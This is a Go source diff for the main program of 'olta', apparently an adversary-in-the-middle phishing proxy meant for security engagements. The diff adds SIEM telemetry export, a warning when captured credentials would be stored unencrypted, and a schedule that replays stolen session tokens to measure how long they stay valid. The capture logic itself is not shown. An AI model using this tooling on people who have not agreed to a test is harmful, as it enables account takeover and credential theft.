@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"flag"
+	"fmt"
 	_log "log"
 	"os"
 	"os/user"
@@ -13,6 +14,7 @@ import (
 	"time"
 
 	"github.com/caddyserver/certmagic"
+	"github.com/s4l1hs/olta/pkg/campaign/secrets"
 	feedclient "github.com/s4l1hs/olta/pkg/feed/client"
 	"github.com/s4l1hs/olta/pkg/proxy/campaignstore"
 	"github.com/s4l1hs/olta/pkg/proxy/core"
@@ -25,6 +27,7 @@ import (
 	"github.com/s4l1hs/olta/pkg/telemetry"
 	feedsink "github.com/s4l1hs/olta/pkg/telemetry/sink/feed"
 	"github.com/s4l1hs/olta/pkg/telemetry/sink/jsonl"
+	"github.com/s4l1hs/olta/pkg/telemetry/sink/siem"
 	"github.com/s4l1hs/olta/pkg/telemetry/sink/webhook"
 	"go.uber.org/zap"
 )
@@ -57,6 +60,54 @@ var js_inspect_endpoint = flag.String("js-inspect-endpoint", "/_assets/js/v.js",
 var enable_session_validator = flag.Bool("enable-session-validator", false, "Asynchronously validate captured cookie sessions")
 var webhook_url = flag.String("webhook-url", "", "Discord, Slack, or generic JSON webhook that receives every engagement telemetry stage")
 var telemetry_file = flag.String("telemetry-file", "", "Append ATT&CK-tagged telemetry events to this JSONL file")
+var siem_url = flag.String("siem-url", "", "SIEM endpoint that receives every telemetry event in a native schema: a Splunk HEC collector or an Elasticsearch/OpenSearch document endpoint. The token is read from the OLTA_SIEM_TOKEN environment variable")
+var siem_transport = flag.String("siem-transport", string(siem.TransportElastic), "SIEM delivery dialect: elastic or splunk_hec")
+var siem_schema = flag.String("siem-schema", string(siem.SchemaECS), "SIEM document schema: ecs or ocsf")
+var siem_auth_scheme = flag.String("siem-auth-scheme", "ApiKey", "Authorization scheme for -siem-transport=elastic (ignored for splunk_hec, which always uses Splunk)")
+var siem_sourcetype = flag.String("siem-sourcetype", "olta:telemetry", "Splunk sourcetype for -siem-transport=splunk_hec (ignored by elastic)")
+var session_recheck_schedule = flag.String("session-recheck-schedule", "5m,30m,2h,8h,24h", "Comma-separated delays after capture at which a still-valid session is replayed again, measuring how long a stolen token stays usable (empty disables rechecks)")
+
+// siemTokenEnvironment names the environment variable holding the SIEM
+// endpoint's credential. It is not a flag on purpose: flag values appear in
+// ps output for every user on the host.
+const siemTokenEnvironment = "OLTA_SIEM_TOKEN"
+
+// parseRecheckSchedule turns the -session-recheck-schedule flag into the
+// delays the validation worker re-arms a session at. An empty value means no
+// rechecks, which is a single validation per capture -- the behavior before
+// the flag existed.
+func parseRecheckSchedule(value string) ([]time.Duration, error) {
+	value = strings.TrimSpace(value)
+	if value == "" {
+		return nil, nil
+	}
+	var schedule []time.Duration
+	for _, field := range strings.Split(value, ",") {
+		field = strings.TrimSpace(field)
+		if field == "" {
+			continue
+		}
+		delay, err := time.ParseDuration(field)
+		if err != nil {
+			return nil, fmt.Errorf("invalid recheck delay %q: %w", field, err)
+		}
+		if delay <= 0 {
+			return nil, fmt.Errorf("recheck delay %q must be positive", field)
+		}
+		schedule = append(schedule, delay)
+	}
+	return schedule, nil
+}
+
+// siemSchemaForTelemetry reports the SIEM schema for the startup event, or
+// an empty string when no SIEM destination is configured -- so a report never
+// shows a schema for a sink that does not exist.
+func siemSchemaForTelemetry(configured bool, schema string) string {
+	if !configured {
+		return ""
+	}
+	return strings.ToLower(strings.TrimSpace(schema))
+}
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -99,6 +150,20 @@ type startupTelemetryConfig struct {
 	JSInspectEndpoint       string
 	SessionValidatorEnabled bool
 	FeedEnabled             bool
+
+	// SecretsEncryptionEnabled reports whether OLTA_MASTER_KEY was
+	// configured, i.e. whether captured credentials and session tokens are
+	// encrypted at rest for this engagement. It is a posture boolean, never
+	// the key itself.
+	SecretsEncryptionEnabled bool
+
+	// SIEMConfigured reports whether a native-schema SIEM destination was
+	// configured. Presence only: the endpoint URL and its credential are
+	// both sensitive, and this event fans out to every sink.
+	SIEMConfigured bool
+	// SIEMSchema is the document schema in use ("ecs" or "ocsf"), a
+	// non-secret enum. Empty when no SIEM destination is configured.
+	SIEMSchema string
 
 	// Turnstile, WebhookURL, CampaignDBDriver, and CampaignDBTLSCA hold the
 	// raw flag values that can carry a secret, on purpose: -turnstile is a
@@ -155,6 +220,9 @@ func buildStartupEvent(cfg startupTelemetryConfig) telemetry.Event {
 		WithDetail("js_inspect_endpoint", cfg.JSInspectEndpoint).
 		WithDetail("session_validator_enabled", cfg.SessionValidatorEnabled).
 		WithDetail("feed_enabled", cfg.FeedEnabled).
+		WithDetail("secrets_encryption_enabled", cfg.SecretsEncryptionEnabled).
+		WithDetail("siem_configured", cfg.SIEMConfigured).
+		WithDetail("siem_schema", cfg.SIEMSchema).
 		// Presence/enum only below -- never the secret value itself.
 		WithDetail("turnstile_enabled", cfg.Turnstile != "").
 		WithDetail("webhook_configured", strings.TrimSpace(cfg.WebhookURL) != "").
@@ -267,6 +335,28 @@ func main() {
 	}
 	cfg.SetRedirectorsDir(*redirectors_dir)
 
+	// Load the master key here, before anything opens a store, so the
+	// operator learns the encryption posture once at startup rather than
+	// never. database.NewDatabase and campaignstore.New both call
+	// ConfigureFromEnvironment themselves -- reading the same environment
+	// variable, so this is idempotent and they stay self-sufficient as
+	// libraries -- but both discard the "is encryption on" result, and the
+	// proxy is the process that writes the highest-value material there is:
+	// captured cookie auth tokens and credentials. Without this, an
+	// operator who forgot OLTA_MASTER_KEY gets a proxy that silently stores
+	// that material as plaintext, with nothing on screen to say so. The
+	// campaign service has warned about exactly this since its own Setup
+	// (see pkg/campaign/models.Setup); this closes the same gap on the side
+	// that holds the loot.
+	secretsEncryptionEnabled, err := secrets.ConfigureFromEnvironment()
+	if err != nil {
+		log.Fatal("master key: %v", err)
+		return
+	}
+	if !secretsEncryptionEnabled {
+		log.Warning("%s is not configured; captured credentials and session tokens will be stored as plaintext at rest", secrets.MasterKeyEnvironment)
+	}
+
 	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
 	if err != nil {
 		log.Fatal("database: %v", err)
@@ -317,18 +407,62 @@ func main() {
 		}
 		sinks = append(sinks, fileSink)
 	}
-	telemetryBus := telemetry.NewBus(1024, sinks...)
+	siemConfigured := strings.TrimSpace(*siem_url) != ""
+	if siemConfigured {
+		// The token comes from the environment, never a flag: a flag value
+		// is visible in ps output to every user on the host, and this
+		// repository already reads its other credentials (OLTA_MASTER_KEY,
+		// OLTA_FEED_VIEWER_TOKEN) the same way.
+		siemSink, err := siem.New(siem.Config{
+			Endpoint:   *siem_url,
+			Transport:  siem.Transport(strings.ToLower(strings.TrimSpace(*siem_transport))),
+			Schema:     siem.Schema(strings.ToLower(strings.TrimSpace(*siem_schema))),
+			Token:      os.Getenv(siemTokenEnvironment),
+			AuthScheme: *siem_auth_scheme,
+			SourceType: *siem_sourcetype,
+		})
+		if err != nil {
+			log.Fatal("configure siem sink: %v (set %s for the endpoint's credential)", err, siemTokenEnvironment)
+			return
+		}
+		sinks = append(sinks, siemSink)
+	}
+	// One identity per proxy process, stamped by the bus onto every event.
+	// It says which proxy served an event when several write to one campaign
+	// database; it does not separate campaigns, which is what the hostname on
+	// each unattributed event is for.
+	instanceID := telemetry.NewInstanceID()
+	telemetryBus := telemetry.NewBusForInstance(instanceID, 1024, sinks...)
 	defer func() {
 		if err := telemetryBus.Close(); err != nil {
 			log.Error("telemetry bus shutdown: %v", err)
 		}
+		// The bus separates three different losses on purpose; report them
+		// separately too, because each one points at a different fix. An
+		// engagement report is computed from telemetry_events alone, so
+		// any of these being non-zero means the report a defender reads is
+		// missing data with nothing in it to say so -- this line is the
+		// only place that fact surfaces.
+		dropped, failed, undelivered := telemetryBus.Dropped(), telemetryBus.Failed(), telemetryBus.Undelivered()
+		if dropped == 0 && failed == 0 && undelivered == 0 {
+			log.Debug("telemetry: no events lost")
+			return
+		}
+		log.Warning("telemetry: %d event(s) lost -- %d dropped (queue too small), %d failed (a sink rejected or timed out), %d undelivered (shutdown deadline passed). The engagement report is incomplete by that many events.",
+			dropped+failed+undelivered, dropped, failed, undelivered)
 	}()
 	campaignEvents.SetEmitter(telemetryBus)
 
 	var sessionValidator *validation.Worker
 	if *enable_session_validator {
+		recheckSchedule, scheduleErr := parseRecheckSchedule(*session_recheck_schedule)
+		if scheduleErr != nil {
+			log.Fatal("session validator: %v", scheduleErr)
+			return
+		}
 		sessionValidator, err = validation.NewWorker(validation.WorkerConfig{
-			Emitter: telemetryBus,
+			Emitter:         telemetryBus,
+			RecheckSchedule: recheckSchedule,
 			OnResult: func(result validation.Result) {
 				log.Info("session validator: %s session %s for %s", result.Status, result.SessionReference, result.TargetHost)
 			},
@@ -490,25 +624,28 @@ func main() {
 	// buildStartupEvent for why turnstile, webhook-url, and the campaign DB
 	// value never appear in it.
 	telemetryBus.Emit(buildStartupEvent(startupTelemetryConfig{
-		Version:                 core.VERSION,
-		DeveloperMode:           *developer_mode,
-		ProxyHeaderTrustEnabled: *cloaker_trust_proxy_headers,
-		ClientProfile:           *client_profile,
-		RateLimitMax:            *rate_limit,
-		RateLimitWindow:         *rate_window,
-		CloakerEnabled:          *enable_cloaker,
-		CloakerAction:           strings.ToLower(*cloaker_action),
-		CloakerBlockStatus:      *cloaker_block_status,
-		IPSyncEnabled:           *enable_ip_sync,
-		IPSyncInterval:          *ip_sync_interval,
-		JSInspectEnabled:        *enable_js_inspect,
-		JSInspectEndpoint:       *js_inspect_endpoint,
-		SessionValidatorEnabled: *enable_session_validator,
-		FeedEnabled:             *feed_enabled,
-		Turnstile:               *turnstile,
-		WebhookURL:              *webhook_url,
-		CampaignDBDriver:        *campaign_db_driver,
-		CampaignDBTLSCA:         *campaign_db_tls_ca,
+		Version:                  core.VERSION,
+		DeveloperMode:            *developer_mode,
+		ProxyHeaderTrustEnabled:  *cloaker_trust_proxy_headers,
+		ClientProfile:            *client_profile,
+		RateLimitMax:             *rate_limit,
+		RateLimitWindow:          *rate_window,
+		CloakerEnabled:           *enable_cloaker,
+		CloakerAction:            strings.ToLower(*cloaker_action),
+		CloakerBlockStatus:       *cloaker_block_status,
+		IPSyncEnabled:            *enable_ip_sync,
+		IPSyncInterval:           *ip_sync_interval,
+		JSInspectEnabled:         *enable_js_inspect,
+		JSInspectEndpoint:        *js_inspect_endpoint,
+		SessionValidatorEnabled:  *enable_session_validator,
+		FeedEnabled:              *feed_enabled,
+		SecretsEncryptionEnabled: secretsEncryptionEnabled,
+		SIEMConfigured:           siemConfigured,
+		SIEMSchema:               siemSchemaForTelemetry(siemConfigured, *siem_schema),
+		Turnstile:                *turnstile,
+		WebhookURL:               *webhook_url,
+		CampaignDBDriver:         *campaign_db_driver,
+		CampaignDBTLSCA:          *campaign_db_tls_ca,
 	}))
 
 	hp.Start()
